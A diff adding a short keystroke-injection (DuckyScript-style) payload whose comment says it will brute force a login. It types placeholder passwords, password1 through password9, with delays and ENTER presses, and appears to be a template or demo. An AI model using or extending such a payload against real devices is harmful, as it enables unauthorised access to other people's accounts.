@@ -1,0 +1,29 @@
+REM The following will brute force your login
+DELAY 1000
+STRING password1
+ENTER
+DELAY 500
+STRING password2
+ENTER
+DELAY 500
+STRING password3
+ENTER
+DELAY 500
+STRING password4
+ENTER
+DELAY 500
+STRING password5
+ENTER
+DELAY 500
+STRING password6
+ENTER
+DELAY 500
+STRING password7
+ENTER
+DELAY 500
+STRING password8
+ENTER
+DELAY 500
+STRING password9
+ENTER
+DELAY 500
